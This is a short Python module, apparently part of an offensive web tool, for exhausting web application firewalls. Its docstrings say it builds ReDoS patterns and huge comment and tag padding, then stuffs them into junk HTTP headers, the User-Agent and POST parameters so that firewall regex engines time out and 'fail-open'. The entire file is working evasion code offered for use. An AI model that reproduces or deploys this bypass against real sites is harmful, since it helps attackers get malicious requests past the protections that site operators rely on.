import random
import string

# Known computationally expensive regex patterns that WAFs struggle with
REDOS_PATTERNS = [
    # Exponential nested groupings
    "(((((a)*)*)*)*)*!",
    "(a+)+b",
    "([a-zA-Z]+)*$",
    # Catastrophic overlapping alternations
    "(a|aa)+b",
    "(a|a?)+b",
    # Specific known ModSecurity/OWASP CRS bypasses
    # e.g., massive SQL comment sequences or extreme HTML tag nesting
    "<!--" + (" " * 50000) + "-->",
    "/*" + ("*" * 50000) + "*/",
    "<" + (" " * 50000) + "script>",
]


def generate_redos_padding(length: int = 64000) -> str:
    """Generates a massive, computationally heavy padding string.

    Designed to trigger Regular Expression Denial of Service (ReDoS)
    in WAF matching engines or force buffer overflows/timeouts,
    causing them to fail-open.
    """
    pattern = random.choice(REDOS_PATTERNS)

    # If the pattern is already huge, just return it
    if len(pattern) >= length:
        return pattern

    # Scale up the ReDoS pattern to the requested length
    padding = pattern * (length // len(pattern) + 1)
    return padding[:length]


def generate_noise_headers(level: int = 1) -> dict:
    """Generates junk HTTP headers filled with expensive regex patterns.

    Level 1: 16KB of noise
    Level 2: 64KB of noise
    Level 3: 256KB of noise
    """
    size = 16000 * (4 ** (level - 1))

    headers = {
        "X-waf-exhaust-1": generate_redos_padding(size // 4),
        "X-waf-exhaust-2": generate_redos_padding(size // 4),
        "User-Agent": generate_redos_padding(size // 4),  # WAFs love parsing UAs
        "Accept-Language": "en-US,en;q=0.9," + generate_redos_padding(size // 4),
    }
    return headers


def apply_exhaustion_to_data(data: dict, length: int = 64000) -> dict:
    """Injects massive junk parameters into POST data to exhaust WAF body parsers."""
    if not data:
        data = {}

    data["_waf_junk_data_1"] = generate_redos_padding(length // 2)
    data["_waf_junk_data_2"] = "".join(
        random.choices(string.ascii_letters + string.digits, k=length // 2)
    )

    return data
